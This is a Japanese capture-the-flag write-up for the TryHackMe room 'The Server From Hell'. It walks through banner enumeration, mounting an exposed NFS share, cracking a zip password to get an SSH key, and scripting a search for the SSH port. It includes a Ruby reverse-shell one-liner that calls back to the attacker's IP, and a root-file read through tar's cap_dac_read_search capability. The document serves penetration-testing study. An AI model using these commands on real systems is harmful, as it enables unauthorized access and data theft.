# The Server From Hell CTF

https://tryhackme.com/room/theserverfromhell

## Enumeration

```shell
TARGET=10.201.49.115
```

### ポートスキャン

```shell
sudo nmap -sS -p- $TARGET
```

開いているポートが大量にある。ルームの指示に従って1137ポートから確認。

## 1337

```sh
$ nc $TARGET 1337
Welcome traveller, to the beginning of your journey
To begin, find the trollface
Legend says he's hiding in the first 100 ports
Try printing the banners from the ports
```

1から100ポートの間に、バナーが表示されるポートがあるという意味か？  
よく分からないが出力してみる。

```
$ python ./try100.py
550 12345 0000000000000000000000000000000000000000000000000000000
550 12345 0000000000000000000000000000000000000000000000000000000
550 12345 0000000000000000000000000000000000000000000000000000000
550 12345 0000000000000000000000000000000000000000000000000000000
550 12345 0000000000000000000000000000000000000000000000000000000
550 12345 0ffffffffffffffffffffffffffffffffffffffffffffffffffff00
550 12345 0fffffffffffff777778887777777777cffffffffffffffffffff00
550 12345 0fffffffffff8000000000000000008888887cfcfffffffffffff00
550 12345 0ffffffffff80000088808000000888800000008887ffffffffff00
550 12345 0fffffffff70000088800888800088888800008800007ffffffff00
550 12345 0fffffffff000088808880000000000000088800000008fffffff00
550 12345 0ffffffff80008808880000000880000008880088800008ffffff00
550 12345 0ffffffff000000888000000000800000080000008800007fffff00
550 12345 0fffffff8000000000008888000000000080000000000007fffff00
550 12345 0ffffff70000000008cffffffc0000000080000000000008fffff00
550 12345 0ffffff8000000008ffffff007f8000000007cf7c80000007ffff00
550 12345 0fffff7880000780f7cffff7800f8000008fffffff80808807fff00
550 12345 0fff78000878000077800887fc8f80007fffc7778800000880cff00
550 12345 0ff70008fc77f7000000f80008f8000007f0000000000000888ff00
550 12345 0ff0008f00008ffc787f70000000000008f000000087fff8088cf00
550 12345 0f7000f800770008777 go to port 12345 80008f7f700880cf00
550 12345 0f8008c008fff8000000000000780000007f800087708000800ff00
550 12345 0f8008707ff07ff8000008088ff800000000f7000000f800808ff00
550 12345 0f7000f888f8007ff7800000770877800000cf780000ff00807ff00
550 12345 0ff0808800cf0000ffff70000f877f70000c70008008ff8088fff00
550 12345 0ff70800008ff800f007fff70880000087f70000007fcf7007fff00
550 12345 0fff70000007fffcf700008ffc778000078000087ff87f700ffff00
550 12345 0ffffc000000f80fff700007787cfffc7787fffff0788f708ffff00
550 12345 0fffff7000008f00fffff78f800008f887ff880770778f708ffff00
550 12345 0ffffff8000007f0780cffff700000c000870008f07fff707ffff00
550 12345 0ffffcf7000000cfc00008fffff777f7777f777fffffff707ffff00
550 12345 0cccccff0000000ff000008c8cffffffffffffffffffff807ffff00
550 12345 0fffffff70000000ff8000c700087fffffffffffffffcf808ffff00
550 12345 0ffffffff800000007f708f000000c0888ff78f78f777c008ffff00
550 12345 0fffffffff800000008fff7000008f0000f808f0870cf7008ffff00
550 12345 0ffffffffff7088808008fff80008f0008c00770f78ff0008ffff00
550 12345 0fffffffffffc8088888008cffffff7887f87ffffff800000ffff00
550 12345 0fffffffffffff7088888800008777ccf77fc777800000000ffff00
550 12345 0fffffffffffffff800888880000000000000000000800800cfff00
550 12345 0fffffffffffffffff70008878800000000000008878008007fff00
550 12345 0fffffffffffffffffff700008888800000000088000080007fff00
550 12345 0fffffffffffffffffffffc800000000000000000088800007fff00
550 12345 0fffffffffffffffffffffff7800000000000008888000008ffff00
550 12345 0fffffffffffffffffffffffff7878000000000000000000cffff00
550 12345 0ffffffffffffffffffffffffffffffc880000000000008ffffff00
550 12345 0ffffffffffffffffffffffffffffffffff7788888887ffffffff00
550 12345 0ffffffffffffffffffffffffffffffffffffffffffffffffffff00
550 12345 0000000000000000000000000000000000000000000000000000000
550 12345 0000000000000000000000000000000000000000000000000000000
550 12345 0000000000000000000000000000000000000000000000000000000
220 aTgWol SMTP; o +3{4}
500 Syntax error, command unrecognized


HTTP/1.1 405 Method Not Allowed
Server: Cassini/eGKYLK
gX-AspNet-Version: JSjBcSS
y<title>Runtime Error</title>
        <style>
         body {font-family:"Verdana";font-weight:normal;font-size: .7em;color:black;}

HTTP/1.1 200 OK
Content-Type: text/html
Content-Length: 227

<html> <head> <title>D-Link VoIP Router</title>

220-Stalker Internet Mail Server VyauxWmvmPo is ready.


0odn�SMBr0000��00000000000000@0000200A000000000��0�lfconbwcnj0vuqtapcupeqhlujgjl`_+�U0S�+0)     *�H��+  *�H��
+�7
�$0"� f/YrcT@

����

Product type: Avaya iMedia Gateway Release F



Login: 

����
Welcome to IFBD-HE05/06 TELNET Utility.
Copyright(C) 2005 Star Micronics co., Ltd.

<< Connected Device >>
    Device Model: x(STR_T-001)
    NIC Product : IFBD-HE05/06
    MAC Address : F93:65074

 
login: 


HTTP/1.0 403 Access Denied
Connection: close

<html>The request you issued is not authorized for GoogleSharing.


HTTP/1.1 200 OK
Content-Type: text/html
Content-Length: 17

No soap. Radio!



hInternal KDC error, contact administrator

HTTP/1.0 806 n
Date: e
Server: Systinet Server for Java/89 (�
��j�c)



Efficient 5851 SDSL [CM] Router (5851-2) v63971 Ready
��������Login: 

000M�SMBr0000�e 000000000000000@0000200iotodade��00

220 ESMTP Ready
250-fjlsPps Hello [4]
250-SIZE
250-PIPELINING
250-DSN
250-ENHANCEDSTATUSCODES
250-STARTTLS
250-X-ANONYMOUSTLS
250-AUTH NTLM
250-X-EXPS GSSAPI NTLM
250-8BITMIME
250-BINARYMIME
250-CHUNKING
250-XEXCH50
250 XRDST


HTTP/1.1 403 Forbidden
Date: n GMT
Content-Length: 13
Connection: close
Cache-Control: no-cache

403 Forbidden

HTTP/1.0 426 f  <title>Strongdc++ webserver - Login Page</title>

00000p000H���0wy

220 FTP print service:V-2NOzyIuxI/Use the network password for the ID if updating.
| p|Brother/HP printer ftpd

{e} NODEINFO (9) {4}Version: 3hya Microsoft Routing Server ready
  

501 Could not read config file �!
220 pv AMANDA index server (tQtovP) ready.


HTTP/1.1 401 Not Authorized
Server: Rapid Logic/0
hWWW-Authenticate: Basic realm="�C{j��"


a-z]{2}, a-z]{2} 7{1,2}, 2092, 84:72:67-UTC

HTTP/1.0 301 MOVED PERMANENTLY
Content-Type: text/html; charset=utf-8
Content-Length: 5r
Location: http://0.0.0.0:4web/webclient/home
Server: Werkzeug/HgQn_Uz Python/CoZvPL


0

HTTP/1.0 401 Authorization Required
WWW-Authenticate: Basic realm="VoIP841"
r
Server: simple httpd gCtBJz


220 ZXYw ESMTP Sendmail Switch-40933/Switch-233776;

HTTP/1.1 500 ( Die Anforderung wurde vom HTTP-Filter zurückgewiesen. Wenden Sie sich an den ISA Server-Administrator.  )


SynchroEdit 75 running on nHQxWPQ


HTTP/1.0 877 k
Server: Fnord


00000qwjl0000araekago�}pMyBookWorld*Netatalk APAFP2.2AFPX03AFP3.1AFP3.2AFP3.3

HTTP/1.0 200 OK
Content-Type: text/html

<html>
<body>
<ul><li>
<iL</i>
<ul><li>
<i>Nice</i>
<ul><li>
Number: 1/li></ul>
<i>ProgramArguments</i>
<ol>
<li>String: �,2��$�</li>


-ERR Permission denied - closing connection.


220 S+ Welcome to SpamFilter for ISP SMTP Server v0S+

HTTP/1.0 200 OK
Server: eHTTP vRyrEYous
Connection: close
Content-Type: text/html
Content-Length: 115
Cache-Control: no-cache
Set-Cookie: sessionId =WvLWnWvE;postId=; path=/;

<html>
<head>
<meta http-equiv="Refresh"
content="1;url=html/login.html">
</head>

<body>
</body>
</html>


HTTP/1.1 302 Moved Temporarily
Date: x
Location: https://IhJIBAsip:nm
Connection: close



220 rblsmtpd.local


HTTP/1.1 200 OK
Server: Virata-EmWeb/R0ssiwKyUu
Content-Type: text/html
Expires: o
Cache-Control: no-cache
Pragma: no-cache


<html>
<head><title>CopperJet FqO+nf</title>

220-dBmLLLd Stalker Internet Mail Server V.Nlcsa is ready.


Use of uninitialized value in transliteration (tr///) at /var/jchkmail/user-filter

HTTP/1.0 400 bad url /
Server: TinyHTTPProxy/902055039 D�}�t


HTTP/1.0 200 OK
yExpires: Thu, 26 Oct 1995 00:00:00 GMT
vServer: IPC@CHIP
b<TITLE>IPC@CHIP&reg; Main Page</TITLE>

HTTP/1.0 200 OK
Cache-Control: no-cache, must-revalidate
g<TITLE>MusicMagic Server</TITLE>l<td>Total songs</td><td align=right>,8088</td>

220-   __  _   __  __ ___ __
220-  |__ |_) |__ |__  |   /
220-  |   |\  |__ |__  |  /_
220-
220-   The fun has just begun...
220 


HTTP/1.0 200 OK
s

<!DOCTYPE html PUBLIC "-//W3C//DTD XHTML 1.1//EN" "http://www.w3.org/TR/xhtml11/DTD/xhtml11.dtd">
<html><head><title>BitTorrent download info</title>
?</head>
<body>
<h3>BitTorrent download info</h3>
<ul>
<li><strong>tracker version:</strong> 4CKI</li>

HTTP/1.0 200 OK
Date: is, 33 cvp 2513 55:26:43 GMT
Server: Texis-Monitor/w


��▒������Ambit Cable Router

Login: 

����

 Welcome to OpenVMS (TM) Alpha Operating System, Version V6    

Username: 

HTTP/1.0 302 Found
Location: /index.htm



220 fzKw FTP server (KONICA FTPD version 920) ready.



 {4}Line {5,8}User {6,8}Host(s) {13,18}Idle +Location
```

出力を30分ぐらい眺めてようやく `go to port 12345` を発見した。

## 12345

NFSサービスを示唆

```sh
$ nc $TARGET 12345
NFS shares are cool, especially when they are misconfigured
It's on the standard port, no need for another scan
```

一覧

```sh
$ showmount -e $TARGET
Export list for 10.201.49.115:
/home/nfs *
```

マウント。backup.zip をコピー。

```sh
$ sudo mount -t nfs $TARGET:/home/nfs /mnt 

$ ls -al /mnt                                                    
total 16
drwxr-xr-x  2 nobody nogroup 4096 Sep 15  2020 .
drwxr-xr-x 18 root   root    4096 Sep  9 06:53 ..
-rw-r--r--  1 root   root    4534 Sep 15  2020 backup.zip
```

パスワードを要求される。

```sh
$ unzip ./backup.zip                       
Archive:  ./backup.zip
   creating: home/hades/.ssh/
[./backup.zip] home/hades/.ssh/id_rsa password:
```

hashcat(mode:17225) + rockyou.txt でクラック可能。

```sh
$ unzip ./backup.zip 
Archive:  ./backup.zip
[./backup.zip] home/hades/.ssh/id_rsa password: 
  inflating: home/hades/.ssh/id_rsa  
 extracting: home/hades/.ssh/hint.txt  
  inflating: home/hades/.ssh/authorized_keys  
 extracting: home/hades/.ssh/flag.txt  
  inflating: home/hades/.ssh/id_rsa.pub
```

2500から4500の間にSSHがあるということか？

```sh
$ cat home/hades/.ssh/hint.txt 
2500-4500
```

nmapによる特定を試みたが、時間がかかりすぎて無理と判断。

```sh
root@ip-10-201-114-206:~# nmap -sV -p2500-4500 $TARGET > nmap.txt
```

シェルスクリプトで特定。

```sh
$ cat ./find_ssh.sh 
#!/bin/bash
TARGET="10.201.49.115"
USER="hades"
KEY="./home/hades/.ssh/id_rsa"
PORT_START=2500
PORT_END=4500
CONNECT_TIMEOUT=3

for p in $(seq "$PORT_START" "$PORT_END"); do
  ERR=$(ssh -o ConnectTimeout=$CONNECT_TIMEOUT \
            -o BatchMode=yes \
            -o StrictHostKeyChecking=no \
            -o UserKnownHostsFile=/dev/null \
            -i "$KEY" -p $p "$USER@$TARGET" true 2>&1 >/dev/null)

  # 指定のエラーメッセージが含まれる場合は失敗としてスキップ
  if [[ "$ERR" == *"kex_exchange_identification: read: Connection reset by peer"* ]]; then
    # skip (failure)
    continue
  fi
  if [[ "$ERR" == *"invalid format"* ]]; then
    # skip (failure)
    continue
  fi

  # それ以外は成功とみなしポート番号のみ出力
  echo "$p"
done
```

irb のコンソールが表示された。

```sh
$ ssh hades@10.201.49.115 -i ./home/hades/.ssh/id_rsa -p [REDACTED] 2>/dev/null

The programs included with the Ubuntu system are free software;
the exact distribution terms for each program are described in the
individual files in /usr/share/doc/*/copyright.

Ubuntu comes with ABSOLUTELY NO WARRANTY, to the extent permitted by
applicable law.


 ██░ ██ ▓█████  ██▓     ██▓    
▓██░ ██▒▓█   ▀ ▓██▒    ▓██▒    
▒██▀▀██░▒███   ▒██░    ▒██░    
░▓█ ░██ ▒▓█  ▄ ▒██░    ▒██░    
░▓█▒░██▓░▒████▒░██████▒░██████▒
 ▒ ░░▒░▒░░ ▒░ ░░ ▒░▓  ░░ ▒░▓  ░
 ▒ ░▒░ ░ ░ ░  ░░ ░ ▒  ░░ ░ ▒  ░
 ░  ░░ ░   ░     ░ ░     ░ ░   
 ░  ░  ░   ░  ░    ░  ░    ░  ░
                               
 Welcome to hell. We hope you enjoy your stay!
 

The programs included with the Ubuntu system are free software;
the exact distribution terms for each program are described in the
individual files in /usr/share/doc/*/copyright.

Ubuntu comes with ABSOLUTELY NO WARRANTY, to the extent permitted by
applicable law.


 ██░ ██ ▓█████  ██▓     ██▓    
▓██░ ██▒▓█   ▀ ▓██▒    ▓██▒    
▒██▀▀██░▒███   ▒██░    ▒██░    
░▓█ ░██ ▒▓█  ▄ ▒██░    ▒██░    
░▓█▒░██▓░▒████▒░██████▒░██████▒
 ▒ ░░▒░▒░░ ▒░ ░░ ▒░▓  ░░ ▒░▓  ░
 ▒ ░▒░ ░ ░ ░  ░░ ░ ▒  ░░ ░ ▒  ░
 ░  ░░ ░   ░     ░ ░     ░ ░   
 ░  ░  ░   ░  ░    ░  ░    ░  ░
                               
 Welcome to hell. We hope you enjoy your stay!
 irb(main):001:0>
```

リバースシェル実行

```sh
irb(main):002:0> require 'socket'; spawn("sh",[:in,:out,:err]=>TCPSocket.new("10.11.146.32",8888))
```

シェル取得成功

```sh
$ nc -nlvp 8888   
listening on [any] 8888 ...
connect to [10.11.146.32] from (UNKNOWN) [10.201.21.84] 44226
id
uid=1002(hades) gid=1002(hades) groups=1002(hades)
```

## 権限昇格

tar に cap_dac_read_search という見慣れない権限が付いている。

```sh
hades@hell:~$ getcap -r / 2>/dev/null
/usr/bin/mtr-packet = cap_net_raw+ep
/bin/tar = cap_dac_read_search+ep
```

https://book.hacktricks.wiki/en/linux-hardening/privilege-escalation/linux-capabilities.html?highlight=cap_dac_read_search#cap_dac_read_search

要するに、パスさえわかれば何でも読める権限。

```sh
hades@hell:~$ tar xf /root/root.txt -I '/bin/sh -c "cat 1>&2"'
thm{[REDACTED]}
```

## 振り返り

- SSHのポートを見つけるのが一番苦労した。
- cap_dac_read_search は初見で勉強になった。
